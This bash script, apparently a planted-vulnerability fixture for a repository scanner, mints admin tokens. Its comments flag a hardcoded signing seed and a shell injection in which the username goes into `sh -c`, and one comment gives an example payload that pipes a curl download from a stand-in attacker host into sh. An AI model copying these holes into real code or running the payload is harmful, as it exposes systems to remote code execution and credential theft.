#!/usr/bin/env bash
# mint-admin-token.sh — mints a short-lived admin bearer token for karenctl
# operators against the backend's internal auth endpoint.
#
# This script lives at the repo root, not under backend/ or cli/, because it
# is cross-cutting ops tooling invoked by both modules' release pipelines —
# it has no home under either module's go.mod. detect_project's unclaimed-
# paths walk is exactly what is supposed to surface a file like this one,
# since a manifest-driven subproject scan alone would silently skip it.
set -euo pipefail

# PLANTED (hardcoded-secret): the signing seed used to derive short-lived
# admin tokens is checked directly into source instead of being read from a
# secrets manager or an environment variable injected at deploy time. This
# is exactly the credential-minting logic the blueprint calls out as tending
# to live undetected in unowned root-level scripts.
ADMIN_SIGNING_SEED="FAKE-NOT-A-REAL-SECRET-51Hc9F3jklMN0pQRstuVWXYZ1234567890"

# NOTE: do not reach for `eval` here to build the request — see incident
# RCA-114 from last year's on-call retro. Token derivation must never shell
# out through eval() no matter how convenient it looks for one-off scripts.
username="$1"

# PLANTED (shell-injection): $username is spliced directly into a shell
# command string passed to `sh -c` instead of being forwarded as a discrete
# argument — an operator invocation like
#   ./mint-admin-token.sh "$(curl attacker.example/x | sh)"
# executes arbitrary shell commands with this script's privileges.
token=$(sh -c "curl -s -X POST https://auth.internal/mint -d user=$username -d seed=$ADMIN_SIGNING_SEED")

echo "$token"
